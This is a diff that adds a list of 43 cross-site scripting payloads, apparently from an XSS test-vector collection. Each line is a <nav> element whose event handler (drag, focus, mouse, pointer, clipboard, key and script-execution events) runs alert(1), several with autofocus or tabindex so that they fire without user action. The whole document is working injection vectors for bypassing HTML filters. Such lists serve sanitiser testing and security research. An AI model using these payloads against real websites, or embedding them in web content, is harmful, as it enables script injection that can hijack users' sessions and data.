@@ -1,0 +1,43 @@
+<nav draggable="true" ondrag="alert(1)">test</nav>
+<nav draggable="true" ondragend="alert(1)">test</nav>
+<nav draggable="true" ondragenter="alert(1)">test</nav>
+<nav draggable="true" ondragleave="alert(1)">test</nav>
+<nav draggable="true" ondragstart="alert(1)">test</nav>
+<nav id=x tabindex=1 onactivate=alert(1)></nav>
+<nav id=x tabindex=1 onbeforeactivate=alert(1)></nav>
+<nav id=x tabindex=1 onbeforedeactivate=alert(1)></nav><input autofocus>
+<nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>
+<nav id=x tabindex=1 onfocus=alert(1)></nav>
+<nav id=x tabindex=1 onfocusin=alert(1)></nav>
+<nav onafterscriptexecute=alert(1)><script>1</script>
+<nav onbeforecopy="alert(1)" contenteditable>test</nav>
+<nav onbeforecut="alert(1)" contenteditable>test</nav>
+<nav onbeforepaste="alert(1)" contenteditable>test</nav>
+<nav onbeforescriptexecute=alert(1)><script>1</script>
+<nav onblur=alert(1) tabindex=1 id=x></nav><input autofocus>
+<nav onclick="alert(1)">test</nav>
+<nav oncontextmenu="alert(1)">test</nav>
+<nav oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<nav oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<nav ondblclick="alert(1)" autofocus tabindex=1>test</nav>
+<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>
+<nav onkeydown="alert(1)" contenteditable>test</nav>
+<nav onkeypress="alert(1)" contenteditable>test</nav>
+<nav onkeyup="alert(1)" contenteditable>test</nav>
+<nav onmousedown="alert(1)">test</nav>
+<nav onmouseenter="alert(1)">test</nav>
+<nav onmouseleave="alert(1)">test</nav>
+<nav onmousemove="alert(1)">test</nav>
+<nav onmouseout="alert(1)">test</nav>
+<nav onmouseover="alert(1)">test</nav>
+<nav onmouseup="alert(1)">test</nav>
+<nav onmousewheel=alert(1)>requires scrolling
+<nav onpaste="alert(1)" contenteditable>test</nav>
+<nav onpointerdown=alert(1)>XSS</nav>
+<nav onpointerenter=alert(1)>XSS</nav>
+<nav onpointerleave=alert(1)>XSS</nav>
+<nav onpointermove=alert(1)>XSS</nav>
+<nav onpointerout=alert(1)>XSS</nav>
+<nav onpointerover=alert(1)>XSS</nav>
+<nav onpointerrawupdate=alert(1)>XSS</nav>
+<nav onpointerup=alert(1)>XSS</nav>
